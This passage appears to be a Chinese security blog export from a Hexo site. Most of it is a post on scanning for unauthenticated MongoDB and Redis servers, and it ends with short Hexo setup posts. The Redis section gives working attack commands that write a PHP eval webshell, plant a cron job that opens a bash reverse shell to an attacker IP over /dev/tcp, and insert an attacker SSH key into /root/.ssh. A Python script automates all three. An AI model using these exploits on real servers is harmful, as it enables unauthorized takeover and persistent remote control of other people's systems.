class="hljs-string">&quot;端口开放！！！&quot;</span>)<br>        s.close()<br>        check_mongo_connect(ip)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口未开放！！！&quot;</span>)<br><br><span class="hljs-comment">#使用pymongo库的MongoClient尝试连接</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_mongo_connect</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正在尝试连接······&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        client = pymongo.MongoClient(ip,<span class="hljs-number">27017</span>,socketTimeoutMS=<span class="hljs-number">3000</span>)<br>        dbnames = client.list_database_names()<br>        <span class="hljs-built_in">print</span>(dbnames)<br>        <span class="hljs-comment">#通过判断是否有值、布尔值、长度</span><br>        <span class="hljs-keyword">if</span> dbnames <span class="hljs-keyword">and</span> <span class="hljs-built_in">bool</span>(dbnames) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(dbnames):<br>            <span class="hljs-built_in">print</span>(ip+<span class="hljs-string">&quot;存在mongodb未授权访问！！！&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不存在mongodb未授权漏洞&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_port(<span class="hljs-string">&quot;xxx&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921225049595.png" alt="image-20230921225049595"></p><h2 id="redis未授权扫描getshell"><a href="#redis未授权扫描getshell" class="headerlink" title="redis未授权扫描getshell"></a>redis未授权扫描getshell</h2><p>1.扫描端口 默认为6379</p><p>2.尝试连接 能连上即可</p><p>3.getshell</p><ul><li>写webshell</li></ul><p>apache默认网站路径：&#x2F;var&#x2F;www&#x2F;html</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">修改持久化存储指定路径</span><br>config set dir /www/admin/localhost_80/wwwroot<br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改持久化存储指定文件</span><br>config set dbfilename redis.php<br><span class="hljs-meta prompt_">#</span><span class="language-bash">写入webshell</span><br>set x &quot;&lt;?php @eval($_POST[&#x27;r1&#x27;]);?&gt;&quot;<br>save<br>OK<br></code></pre></td></tr></table></figure><ul><li>定时任务crontab</li></ul><p><a href="https://blog.csdn.net/qq_43199509/article/details/120028288">反弹shell失败 原来是这个原因_kali nc不反弹shell_梦想闹钟的博客-CSDN博客</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/反弹的ip/反弹的端口 0&gt;&amp;1\n\n<br><br>s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&#x27; /dev/null<br><br><br>set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/接收shell的ip/端口 0&gt;&amp;1\n&quot; （每隔一分钟执行命令）<br>config set dir /var/spool/cron/<br>config set dbfilename root<br>save<br></code></pre></td></tr></table></figure><p><img src="/img/image-20230921231059319.png" alt="image-20230921231059319"></p><ul><li>ssh免密</li></ul><p>把攻击机公钥写入靶机的.ssh中的authorized_keys文件中</p><p><img src="/img/image-20230921231710861.png" alt="image-20230921231710861"></p><p>实现思路：</p><p>1.扫描端口 默认为6379</p><p>2.使用redis客户端连接</p><p>3.编写getshellEXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> paramiko<br><br>sshkey = <span class="hljs-string">&#x27;攻击机公钥&#x27;</span><br><br><span class="hljs-comment">#用socket扫描端口</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_port</span>(<span class="hljs-params">ip</span>):<br>    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>    s.settimeout(<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">try</span>:<br>        s.connect((ip,<span class="hljs-number">6379</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口开放！！！&quot;</span>)<br>        s.close()<br>        check_redis_connect(ip)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;端口未开放！！！&quot;</span>)<br><br><span class="hljs-comment">#检测漏洞是否存在</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_connect</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-keyword">try</span>:<br>        client = redis.StrictRedis(host=ip,port=<span class="hljs-number">6379</span>,socket_timeout=<span class="hljs-number">0.3</span>)<br>        <span class="hljs-built_in">print</span>(client.client_list())<br>        <span class="hljs-comment">#使用哪个就调用哪个</span><br>        <span class="hljs-comment">#exp_webshell(client)</span><br>        <span class="hljs-comment">#exp_crontab(client)</span><br>        <span class="hljs-comment">#exp_ssh(client,ip)</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;无法连接，不存在redis未授权&quot;</span>)<br><br><br><br><span class="hljs-comment">#1.写webshell</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_webshell</span>(<span class="hljs-params">redis_client</span>):<br>    <span class="hljs-comment">#1.找到web服务器的根目录</span><br>    root = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>    <span class="hljs-comment">#2.写入木马文件</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;shell.php&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;webshell已写入成功&quot;</span>)<br><br><span class="hljs-comment">#2.创建定时任务反弹shell</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_crontab</span>(<span class="hljs-params">redis_client</span>):<br>    <span class="hljs-comment">#1.找到定时任务的目录</span><br>    root = <span class="hljs-string">&quot;/var/spool/cron&quot;</span><br>    <span class="hljs-comment">#2.写入定时任务</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/反弹的ip/反弹的端口 0&gt;&amp;1\n\n&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;定时任务已经创建&quot;</span>)<br><br><span class="hljs-comment">#3.写入攻击机公钥</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp_ssh</span>(<span class="hljs-params">redis_client,ip</span>):<br>    <span class="hljs-comment">#1.找到根目录下的密钥文件</span><br>    root = <span class="hljs-string">&quot;/root/.ssh&quot;</span><br>    <span class="hljs-comment">#2.向靶机中写入公钥</span><br>    redis_client.config_set(<span class="hljs-string">&#x27;dir&#x27;</span>,root)<br>    redis_client.config_set(<span class="hljs-string">&#x27;dbfilename&#x27;</span>,<span class="hljs-string">&#x27;authorized_key&#x27;</span>)<br>    redis_client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;\n\n&#x27;</span>+sshkey+<span class="hljs-string">&#x27;\n\n&#x27;</span>)<br>    redis_client.save()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;免密登录已设置&quot;</span>)<br>    connect_ssh(ip)<br><br><span class="hljs-comment">#ssh连接  注意：ssh连接要在生成公钥的攻击机上执行</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_ssh</span>(<span class="hljs-params">ip</span>):<br>    ssh = paramiko.SSHClient()<br>    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>    <span class="hljs-keyword">try</span>:<br>        ssh.connect(ip,<span class="hljs-number">22</span>,<span class="hljs-string">&#x27;root&#x27;</span>,sshkey)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ssh 连接成功&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;连接失败&#x27;</span>)<br>        <br>scan_port(<span class="hljs-string">&quot;ip&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何新建md文件并发布到github pages</title>
    <link href="/2023/08/22/%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BAmd%E6%96%87%E4%BB%B6%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0github%20pages/"/>
    <url>/2023/08/22/%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BAmd%E6%96%87%E4%BB%B6%E5%B9%B6%E5%8F%91%E5%B8%83%E5%88%B0github%20pages/</url>
    
    <content type="html"><![CDATA[<p>整体搭建教程：<a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p><h1 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h1><p>梯子+proxifier 流量代理  –&gt;  命令行中流量走代理</p><p>proxy servers + proxification rules</p><img src="/img/image-20230831201917406.png" alt="image-20230831201917406" style="zoom:50%;" /><img src="/img/image-20230831202133470.png" alt="image-20230831202133470" style="zoom:50%;" /><h1 id="如何新建md文件并发布到github-pages"><a href="#如何新建md文件并发布到github-pages" class="headerlink" title="如何新建md文件并发布到github pages"></a>如何新建md文件并发布到github pages</h1><h2 id="1-新建md文件"><a href="#1-新建md文件" class="headerlink" title="1.新建md文件"></a>1.新建md文件</h2><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;文件名&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201009555.png" alt="image-20230831201009555"></p><h2 id="2-保存并在本地查看"><a href="#2-保存并在本地查看" class="headerlink" title="2.保存并在本地查看"></a>2.保存并在本地查看</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201308965.png" alt="image-20230831201308965"></p><h2 id="3-保存并发布到github上"><a href="#3-保存并发布到github上" class="headerlink" title="3.保存并发布到github上"></a>3.保存并发布到github上</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g -d</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230831201512390.png" alt="image-20230831201512390"></p><p><img src="/img/image-20230831201529838.png" alt="image-20230831201529838"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/22/hello-world/"/>
    <url>/2023/08/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
